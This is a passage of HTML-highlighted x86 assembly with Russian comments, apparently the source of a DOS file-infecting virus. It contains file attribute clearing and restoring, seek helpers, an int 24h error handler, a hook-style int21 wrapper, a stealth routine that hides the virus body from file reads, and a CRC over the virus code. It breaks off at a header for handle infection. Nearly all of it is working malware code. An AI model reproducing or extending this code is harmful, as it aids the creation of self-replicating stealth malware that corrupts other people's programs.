        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">CloseFile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">          </span><span class="sc1">; закрытие файла</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">LFNClrAttrib</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7143h</span><span class="sc0">        </span><span class="sc1">; LFN получение и очистка аттрибутов</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; файла</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">ClrFailed</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Attrib</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">fn_ptr</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">fn_ptr</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7143h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ClrFailed</span><span class="sc0">

 </span><span class="sc5">ClrAttrib</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">        </span><span class="sc1">; получение и очистка аттрибутов</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">           </span><span class="sc1">; файла</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">ClrFailed</span><span class="sc0">       </span><span class="sc1">; также сохранение указателя на файл</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Attrib</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">fn_ptr</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">fn_ptr</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
 </span><span class="sc5">ClrFailed</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">LFNRestAttrib</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7143h</span><span class="sc0">        </span><span class="sc1">; LFN восстановление аттрибутов</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; файла по сохраненному указателю</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Attrib</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">fn_ptr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">fn_ptr</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
 </span><span class="sc5">RestAttrib</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">        </span><span class="sc1">; восстановление аттрибутов</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Attrib</span><span class="sc0">    </span><span class="sc1">; файла по сохраненному указателю</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">fn_ptr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">fn_ptr</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">SeekSave</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SaveRegs</span><span class="sc0">        </span><span class="sc1">; сохранение позиции</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">           </span><span class="sc1">; указателя (lseek) в файле</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seekfrom_cur</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seek_pos</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seek_pos</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadRegs</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">RestoreSeek</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SaveRegs</span><span class="sc0">        </span><span class="sc1">; восстановление сохраненной</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seek_pos</span><span class="sc0">  </span><span class="sc1">; позиции указателя а файле</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seek_pos</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seekfrom_bof</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadRegs</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">seek2bof</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">        </span><span class="sc1">; установка указателя на</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">           </span><span class="sc1">; начало файла</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">realseek</span><span class="sc0">

 </span><span class="sc5">seek2eof</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">        </span><span class="sc1">; установка указателя на</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">           </span><span class="sc1">; конец файла</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">realseek</span><span class="sc0">

 </span><span class="sc5">seekfrom_eof</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">        </span><span class="sc1">; установка указателя</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">realseek</span><span class="sc0">        </span><span class="sc1">; от конца файла</span><span class="sc0">

 </span><span class="sc5">seekfrom_cur</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4201h</span><span class="sc0">        </span><span class="sc1">; установка указателя</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">realseek</span><span class="sc0">        </span><span class="sc1">; от текущей позиции</span><span class="sc0">

 </span><span class="sc5">seekfrom_bof</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">        </span><span class="sc1">; установка указателя</span><span class="sc0">
                                </span><span class="sc1">; от начала файла</span><span class="sc0">
 </span><span class="sc5">realseek</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; обработчик int 24h</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">int24</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; AL=3:вернуть ошибку</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; псевдо int 21h</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">int21</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pushf</span><span class="sc0">                   </span><span class="sc1">; занос в стек флагов и кодового</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">              </span><span class="sc1">; сегмента</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">exithandler</span><span class="sc0">     </span><span class="sc1">; управление вернется по адресу в стеке</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; проверка файла (дисковый?)</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">HandleCheck</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SaveRegs</span><span class="sc0">        </span><span class="sc1">; сохранение регистров</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4400h</span><span class="sc0">        </span><span class="sc1">; IOCTL: Get device info</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Invalid</span><span class="sc0">         </span><span class="sc1">; bad handle?</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">          </span><span class="sc1">; проверка 7-го бита</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Invalid</span><span class="sc0">         </span><span class="sc1">; если 0, то это дисковый файл</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadRegs</span><span class="sc0">        </span><span class="sc1">; восстановление регистров</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">Invalid</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadRegs</span><span class="sc0">        </span><span class="sc1">; восстановление регистров</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; перевод двух латинских символов в AH и AL в верхний регистр</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">upreg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc0">          </span><span class="sc1">; 'a'</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">badal</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7ah</span><span class="sc0">          </span><span class="sc1">; 'z'</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">badal</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">          </span><span class="sc1">; 's'-&gt;'S'</span><span class="sc0">
 </span><span class="sc5">badal</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc0">          </span><span class="sc1">; 'a'</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">badah</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">7ah</span><span class="sc0">          </span><span class="sc1">; 'z'</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">badah</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">          </span><span class="sc1">; 's'-&gt;'S'</span><span class="sc0">
 </span><span class="sc5">badah</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; SeekHide</span><span class="sc0">
</span><span class="sc1">; если позиция lseek находится на теле вируса, подпрограмма переносит его</span><span class="sc0">
</span><span class="sc1">; на границу вируса и зараженной программы, т.е. на конец чистой программы</span><span class="sc0">
</span><span class="sc1">; SEEK_POS содержат новую позицию lseek</span><span class="sc0">
</span><span class="sc1">; NRBYTES уменьшается на разность двух позиций</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">seekhide</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SaveRegs</span><span class="sc0">        </span><span class="sc1">; сохранение регистров</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SeekSave</span><span class="sc0">        </span><span class="sc1">; сохраняем текущее положение указателя</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; двигаем указатель на границу вируса и</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,-</span><span class="sc5">vsize</span><span class="sc0">       </span><span class="sc1">; программы</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seekfrom_eof</span><span class="sc0">    </span><span class="sc1">; DX:AX - голова вируса</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seek_pos</span><span class="sc0">  </span><span class="sc1">; SEEK_POS - старая позиция</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seek_pos</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; DX:AX должно быть отрицательным</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">not_us</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jns</span><span class="sc0">     </span><span class="sc5">not_us</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; получение разности позиций</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">nrbytes</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; уменьшение количества прочитанных байтов</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seek_pos</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">; уменьшение позиции указателя в файле</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seek_pos</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; т.е. смещение ее на голову вируса</span><span class="sc0">
 </span><span class="sc5">not_us</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RestoreSeek</span><span class="sc0">     </span><span class="sc1">; восстановление позиции указателя</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadRegs</span><span class="sc0">        </span><span class="sc1">; восстановление регистров</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; подсчет CRC вируса</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">crc</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">shield</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">end_crc</span><span class="sc4">-</span><span class="sc5">shield</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crc32</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">CRC32</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc5">mvs</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">

   </span><span class="sc5">NextByteCRC</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
   </span><span class="sc5">NextBitCRC</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">rcr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">NoCRC</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">08320h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0edb8h</span><span class="sc0">
   </span><span class="sc5">NoCRC</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">NextBitCRC</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">NextByteCRC</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; инфицирование handle</span><span class="sc0">
